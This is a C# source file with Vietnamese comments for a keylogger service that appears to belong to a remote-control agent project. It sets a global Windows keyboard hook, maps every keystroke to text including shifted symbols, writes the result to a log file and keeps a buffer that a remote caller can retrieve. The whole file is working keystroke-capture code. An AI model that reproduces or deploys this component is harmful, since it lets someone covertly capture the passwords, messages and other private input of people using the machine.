// KeyLoggerService: Ghi lại phím bấm người dùng
// Sử dụng Windows API SetWindowsHookEx (User32.dll)
// Xuất log ra file keylogger.log

using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteControl.Agent.Services;

public class KeyLoggerService
{
    private Thread? _hookThread;
    private readonly StringBuilder _logBuffer = new StringBuilder();
    private readonly object _lock = new object();
    private bool _isLogging = false;
    private readonly string _logFilePath;

    // ====== Constructor ======
    public KeyLoggerService()
    {
        _instance = this;
        _logFilePath = Path.Combine(Environment.CurrentDirectory, "keylogger.log");
    }

    // ====== Bắt đầu ghi log ======
    public void StartLogging()
    {
        if (_isLogging) return;
        _isLogging = true;
        _logBuffer.Clear();

        // Ghi header vào file
        File.AppendAllText(_logFilePath, $"\nKeyLogger Started: {DateTime.Now:yyyy-MM-dd HH:mm:ss}\n");

        // Chạy Hook trên thread riêng vì Application.Run() sẽ block
        _hookThread = new Thread(StartHookLoop);
        _hookThread.SetApartmentState(ApartmentState.STA);
        _hookThread.IsBackground = true;
        _hookThread.Start();
    }

    // ====== Dừng ghi log ======
    public void StopLogging()
    {
        if (!_isLogging) return;
        _isLogging = false;
        
        // Ghi footer vào file
        File.AppendAllText(_logFilePath, $"\nKeyLogger Stopped: {DateTime.Now:yyyy-MM-dd HH:mm:ss}\n");
    }

    // ====== Lấy nội dung log hiện tại ======
    public string GetLogs()
    {
        lock (_lock)
        {
            var logs = _logBuffer.ToString();
            _logBuffer.Clear();
            return logs;
        }
    }

    // ====== Luồng chạy Hook ======
    private void StartHookLoop()
    {
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    // ====== Windows API Definitions ======
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static KeyLoggerService? _instance;

    [DllImport("user32.dll")]
    private static extern short GetKeyState(int nVirtKey);
    private const int VK_SHIFT = 0x10;
    private const int VK_CAPITAL = 0x14;

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule? curModule = curProcess.MainModule)
        {
            if (curModule?.ModuleName == null) return IntPtr.Zero;
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            var key = (Keys)vkCode;
            
            if (_instance != null && _instance._isLogging)
            {
                string keyStr = ConvertKeyToString(key);
                if (!string.IsNullOrEmpty(keyStr))
                {
                    lock (_instance._lock)
                    {
                        _instance._logBuffer.Append(keyStr);
                    }
                    // Ghi ra file ngay lập tức
                    try { File.AppendAllText(_instance._logFilePath, keyStr); } catch { }
                }
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    // ====== Map phím sang chuỗi (Layout 84 phím đầy đủ) ======
    private static string ConvertKeyToString(Keys key)
    {
        bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
        bool capsOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        bool uppercase = shiftPressed ^ capsOn;

        switch (key)
        {
            // ====== Hàng 1: Esc + F1-F12 ======
            case Keys.Escape: return "[Esc]";
            case Keys.F1: return "[F1]";
            case Keys.F2: return "[F2]";
            case Keys.F3: return "[F3]";
            case Keys.F4: return "[F4]";
            case Keys.F5: return "[F5]";
            case Keys.F6: return "[F6]";
            case Keys.F7: return "[F7]";
            case Keys.F8: return "[F8]";
            case Keys.F9: return "[F9]";
            case Keys.F10: return "[F10]";
            case Keys.F11: return "[F11]";
            case Keys.F12: return "[F12]";
            case Keys.PrintScreen: return "[PrtSc]";
            case Keys.Scroll: return "[ScrLk]";
            case Keys.Pause: return "[Pause]";

            // ====== Hàng 2: ` 1-0 - = Backspace ======
            case Keys.Oemtilde: return shiftPressed ? "~" : "`";
            case Keys.D1: return shiftPressed ? "!" : "1";
            case Keys.D2: return shiftPressed ? "@" : "2";
            case Keys.D3: return shiftPressed ? "#" : "3";
            case Keys.D4: return shiftPressed ? "$" : "4";
            case Keys.D5: return shiftPressed ? "%" : "5";
            case Keys.D6: return shiftPressed ? "^" : "6";
            case Keys.D7: return shiftPressed ? "&" : "7";
            case Keys.D8: return shiftPressed ? "*" : "8";
            case Keys.D9: return shiftPressed ? "(" : "9";
            case Keys.D0: return shiftPressed ? ")" : "0";
            case Keys.OemMinus: return shiftPressed ? "_" : "-";
            case Keys.Oemplus: return shiftPressed ? "+" : "=";
            case Keys.Back: return "[Back]";
            case Keys.Insert: return "[Ins]";
            case Keys.Home: return "[Home]";
            case Keys.PageUp: return "[PgUp]";

            // ====== Hàng 3: Tab Q-P [ ] \ ======
            case Keys.Tab: return "\t";
            case Keys.OemOpenBrackets: return shiftPressed ? "{" : "[";
            case Keys.Oem6: return shiftPressed ? "}" : "]";  // OemCloseBrackets
            case Keys.OemCloseBrackets: return shiftPressed ? "}" : "]";
            case Keys.Oem5: return shiftPressed ? "|" : "\\";  // Backslash key
            case Keys.OemPipe: return shiftPressed ? "|" : "\\";
            case Keys.Delete: return "[Del]";
            case Keys.End: return "[End]";
            case Keys.PageDown: return "[PgDn]";

            // ====== Hàng 4: CapsLock A-L ; ' Enter ======
            case Keys.Capital: return "[CapsLk]";
            case Keys.Oem1: return shiftPressed ? ":" : ";";  // Semicolon
            case Keys.Oem7: return shiftPressed ? "\"" : "'"; // Quote
            case Keys.Enter: return "\n";

            // ====== Hàng 5: Shift Z-M , . / Shift ======
            case Keys.Oemcomma: return shiftPressed ? "<" : ",";
            case Keys.OemPeriod: return shiftPressed ? ">" : ".";
            case Keys.OemQuestion: return shiftPressed ? "?" : "/";
            case Keys.Up: return "[Up]";

            // ====== Hàng 6: Ctrl Win Alt Space Alt Fn Ctrl ======
            case Keys.Space: return " ";
            case Keys.Left: return "[Left]";
            case Keys.Down: return "[Down]";
            case Keys.Right: return "[Right]";
            case Keys.Apps: return "[Menu]";  // Context menu key

            // ====== Numpad ======
            case Keys.NumLock: return "[NumLk]";
            case Keys.Divide: return "/";
            case Keys.Multiply: return "*";
            case Keys.Subtract: return "-";
            case Keys.Add: return "+";
            case Keys.NumPad0: return "0";
            case Keys.NumPad1: return "1";
            case Keys.NumPad2: return "2";
            case Keys.NumPad3: return "3";
            case Keys.NumPad4: return "4";
            case Keys.NumPad5: return "5";
            case Keys.NumPad6: return "6";
            case Keys.NumPad7: return "7";
            case Keys.NumPad8: return "8";
            case Keys.NumPad9: return "9";
            case Keys.Decimal: return ".";

            // ====== Modifiers - Ghi nhận nhưng không log riêng ======
            case Keys.LShiftKey:
            case Keys.RShiftKey:
            case Keys.LControlKey:
            case Keys.RControlKey:
            case Keys.LMenu:      // Left Alt
            case Keys.RMenu:      // Right Alt
            case Keys.LWin:
            case Keys.RWin:
                return "";

            default:
                // ====== Chữ cái A-Z ======
                if (key >= Keys.A && key <= Keys.Z)
                {
                    return uppercase ? key.ToString().ToUpper() : key.ToString().ToLower();
                }
                // Các phím khác không xác định
                return $"[{key}]";
        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string? lpModuleName);
}
